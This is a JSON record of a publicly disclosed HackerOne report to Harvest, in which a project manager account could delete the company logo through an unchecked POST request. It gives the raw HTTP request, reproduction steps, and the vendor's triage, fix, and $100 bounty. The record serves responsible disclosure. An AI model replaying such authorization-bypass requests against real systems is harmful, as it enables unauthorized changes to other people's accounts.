{"id":159387,"global_id":"Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8xNTkzODc=","url":"https://hackerone.com/reports/159387","title":"PM can delete the company logo image (Vertical Privilege Escalation )","state":"Closed","substate":"resolved","readable_substate":"Resolved","created_at":"2016-08-15T01:42:12.510Z","submitted_at":"2016-08-15T01:42:12.510Z","is_member_of_team?":false,"reporter":{"disabled":false,"username":"indoappsec","url":"/indoappsec","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/QUAjqUf576QNBhxg691WB8YG/3afcb5c896247e7ee8ada31b1c1eb8657e22241f911093acfe4ec7e97a3a959a"},"is_me?":false,"cleared":true,"hackerone_triager":false,"hacker_mediation":false},"team":{"id":237,"url":"https://hackerone.com/harvest","handle":"harvest","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/000/000/237/ce650f9fba222040127528a7c95dab237f8a9734_original.png/3afcb5c896247e7ee8ada31b1c1eb8657e22241f911093acfe4ec7e97a3a959a","medium":"https://profile-photos.hackerone-user-content.com/variants/000/000/237/ce650f9fba222040127528a7c95dab237f8a9734_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"permissions":[],"submission_state":"open","default_currency":"usd","awards_miles":false,"offers_bounties":true,"state":"public_mode","only_cleared_hackers":false,"profile":{"name":"Harvest","twitter_handle":"","website":"http://getharvest.com","about":"Harvest is a leader in online time tracking and invoicing. Work better, and make smarter decisions for your business."}},"has_bounty?":true,"in_validation?":false,"rejected_anc_report_that_can_be_sent_back_to_anc_triagers?":false,"can_view_team":true,"can_view_report":true,"is_external_bug":false,"is_published":false,"is_participant":false,"stage":4,"public":true,"visibility":"full","cve_ids":[],"singular_disclosure_disabled":false,"disclosed_at":"2016-09-29T23:03:18.157Z","bug_reporter_agreed_on_going_public_at":"2016-08-30T23:03:07.365Z","team_member_agreed_on_going_public_at":null,"comments_closed?":false,"facebook_team?":false,"team_private?":false,"vulnerability_information":"Hi Team,\n\nDescription : Only Admin can Delete the Company Logo image In company account on harvestapp.But the Deleting Logo HTTP request doesn't validate the Access of the user properly and a Project manager(Limited access to Company Settings ) can  Delete the Logo image of the company.\n\nVulnerable HTTP reuqest : \n\nPOST /logo?referer=invoice HTTP/1.1\nHost: [Company_name].harvestapp.com\nUser-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:47.0) Gecko/20100101 Firefox/47.0\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\nAccept-Language: en-US,en;q=0.5\nAccept-Encoding: gzip, deflate, br\nReferer: https://vijaygangani.harvestapp.com/invoices/configure\nCookie: [Cookie_values]\nConnection: keep-alive\nContent-Type: application/x-www-form-urlencoded\nContent-Length: 132\n\n_method=delete\u0026authenticity_token=[Oauth_Token]\n\nSteps to reproduce : \n1.Create a account with Admin and add project (managerAttacker).\n2.Open Project manager's account and Go to link : https://vijaygangani.harvestapp.com/invoices/configure#appearance_edit \nYou will see that Project manager doesn't  have access to it.\n3.Now send the above mentioned Request to server from Project manager's account and you will see from Admin Account that the Company Logo image has been deleted.\n\nLet me know if you need Video POC for this issue or any other help from my side.\n\nBest Regards !\nVijay Kumar ","vulnerability_information_html":"\u003cp\u003eHi Team,\u003c/p\u003e\n\n\u003cp\u003eDescription : Only Admin can Delete the Company Logo image In company account on harvestapp.But the Deleting Logo HTTP request doesn\u0026#39;t validate the Access of the user properly and a Project manager(Limited access to Company Settings ) can  Delete the Logo image of the company.\u003c/p\u003e\n\n\u003cp\u003eVulnerable HTTP reuqest : \u003c/p\u003e\n\n\u003cp\u003ePOST /logo?referer=invoice HTTP/1.1\u003cbr\u003e\nHost: [Company_name].harvestapp.com\u003cbr\u003e\nUser-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:47.0) Gecko/20100101 Firefox/47.0\u003cbr\u003e\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,\u003cem\u003e/\u003c/em\u003e;q=0.8\u003cbr\u003e\nAccept-Language: en-US,en;q=0.5\u003cbr\u003e\nAccept-Encoding: gzip, deflate, br\u003cbr\u003e\nReferer: \u003ca title=\"https://vijaygangani.harvestapp.com/invoices/configure\" href=\"/redirect?url=https%3A%2F%2Fvijaygangani.harvestapp.com%2Finvoices%2Fconfigure\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttps://vijaygangani.harvestapp.com/invoices/configure\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e\u003cbr\u003e\nCookie: [Cookie_values]\u003cbr\u003e\nConnection: keep-alive\u003cbr\u003e\nContent-Type: application/x-www-form-urlencoded\u003cbr\u003e\nContent-Length: 132\u003c/p\u003e\n\n\u003cp\u003e_method=delete\u0026amp;authenticity_token=[Oauth_Token]\u003c/p\u003e\n\n\u003cp\u003eSteps to reproduce : \u003cbr\u003e\n1.Create a account with Admin and add project (managerAttacker).\u003cbr\u003e\n2.Open Project manager\u0026#39;s account and Go to link : \u003ca title=\"https://vijaygangani.harvestapp.com/invoices/configure#appearance_edit\" href=\"/redirect?url=https%3A%2F%2Fvijaygangani.harvestapp.com%2Finvoices%2Fconfigure%23appearance_edit\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttps://vijaygangani.harvestapp.com/invoices/configure#appearance_edit\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e \u003cbr\u003e\nYou will see that Project manager doesn\u0026#39;t  have access to it.\u003cbr\u003e\n3.Now send the above mentioned Request to server from Project manager\u0026#39;s account and you will see from Admin Account that the Company Logo image has been deleted.\u003c/p\u003e\n\n\u003cp\u003eLet me know if you need Video POC for this issue or any other help from my side.\u003c/p\u003e\n\n\u003cp\u003eBest Regards !\u003cbr\u003e\nVijay Kumar \u003c/p\u003e\n","bounty_amount":"100.0","formatted_bounty":"$100","weakness":{"id":75,"name":"Privilege Escalation"},"original_report_id":null,"original_report_url":null,"attachments":[],"allow_singular_disclosure_at":"2016-09-29T23:03:07.502Z","allow_singular_disclosure_after":-134026393.07495642,"singular_disclosure_allowed":true,"vote_count":12,"voters":["thisishrsh","dmatrix","dilawer01","madrobot","vijay_kumar","jens","jbbbkj","sumit7","spetr0x","nigba","and 2 more..."],"structured_scope":null,"abilities":{"assignable_team_members":[],"assignable_team_member_groups":[]},"can_edit_custom_fields_attributes":false,"activities":[{"id":1147162,"is_internal":false,"editable":false,"type":"Activities::BugTriaged","message":"Hi Vijay,\n\nWe just confirmed this vulnerability and I'm changing the state to triage.\nWe will contact you as soon as it is fixed.\n\nThanks!\nJorge","markdown_message":"\u003cp\u003eHi Vijay,\u003c/p\u003e\n\n\u003cp\u003eWe just confirmed this vulnerability and I\u0026#39;m changing the state to triage.\u003cbr\u003e\nWe will contact you as soon as it is fixed.\u003c/p\u003e\n\n\u003cp\u003eThanks!\u003cbr\u003e\nJorge\u003c/p\u003e\n","automated_response":false,"created_at":"2016-08-23T09:52:00.466Z","updated_at":"2016-08-23T09:52:00.466Z","actor":{"username":"jorgeleria","cleared":false,"url":"/jorgeleria","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/002/680/84ed9b9afaf2905ae339b479cf97d7161fd1ae64_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"harvest","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":1159982,"is_internal":false,"editable":false,"type":"Activities::BugResolved","message":"Hi again - this one should be fixed too \nCould you check if you are able to reproduce it on your end?\n\nThanks,\nJorge","markdown_message":"\u003cp\u003eHi again - this one should be fixed too \u003cbr\u003e\nCould you check if you are able to reproduce it on your end?\u003c/p\u003e\n\n\u003cp\u003eThanks,\u003cbr\u003e\nJorge\u003c/p\u003e\n","automated_response":false,"created_at":"2016-08-29T15:26:56.086Z","updated_at":"2016-08-29T15:26:56.086Z","actor":{"username":"jorgeleria","cleared":false,"url":"/jorgeleria","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/002/680/84ed9b9afaf2905ae339b479cf97d7161fd1ae64_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"reporter":{"username":"indoappsec","url":"/indoappsec"},"genius_execution_id":null,"team_handle":"harvest","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":1162665,"is_internal":false,"editable":false,"type":"Activities::BountyAwarded","message":"Thanks for helping make Harvest more secure!","markdown_message":"\u003cp\u003eThanks for helping make Harvest more secure!\u003c/p\u003e\n","automated_response":false,"created_at":"2016-08-30T16:49:15.487Z","updated_at":"2016-08-30T16:49:15.487Z","actor":{"url":"/harvest","ibb":false,"profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/000/237/ce650f9fba222040127528a7c95dab237f8a9734_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"profile":{"name":"Harvest"}},"bounty_amount":"100.0","bounty_currency":"usd","genius_execution_id":null,"team_handle":"harvest","collaborator":{"username":"indoappsec","url":"/indoappsec"},"actor_is_team_member":true,"actor_is_concealed_member":false},{"id":1163622,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"","markdown_message":"","automated_response":false,"created_at":"2016-08-30T23:03:07.442Z","updated_at":"2016-08-30T23:03:07.442Z","first_to_agree":true,"actor":{"username":"indoappsec","cleared":true,"url":"/indoappsec","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/QUAjqUf576QNBhxg691WB8YG/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"harvest","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":1223852,"is_internal":false,"editable":false,"type":"Activities::ReportTitleUpdated","message":"","markdown_message":"","automated_response":false,"created_at":"2016-09-29T15:53:51.845Z","updated_at":"2016-09-29T15:53:51.845Z","additional_data":{"old_title":"Unautherized Project manager can Delete the Company Logo image(Vertical Privilege Escalation )","new_title":"PM can delete the company logo image (Vertical Privilege Escalation )"},"actor":{"username":"jorgeleria","cleared":false,"url":"/jorgeleria","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/002/680/84ed9b9afaf2905ae339b479cf97d7161fd1ae64_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"harvest","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":1224816,"is_internal":false,"editable":false,"type":"Activities::ReportBecamePublic","message":"","markdown_message":"","automated_response":false,"created_at":"2016-09-29T23:03:18.178Z","updated_at":"2016-09-29T23:03:18.178Z","actor":{"url":"/harvest","ibb":false,"profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/000/237/ce650f9fba222040127528a7c95dab237f8a9734_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"profile":{"name":"Harvest"}},"genius_execution_id":null,"team_handle":"harvest","actor_is_team_member":false,"actor_is_concealed_member":false}],"activity_page_count":1,"activity_page_number":1,"summaries":[{"category":"team","can_view?":true,"can_create?":false},{"category":"researcher","can_view?":true,"can_create?":false}]}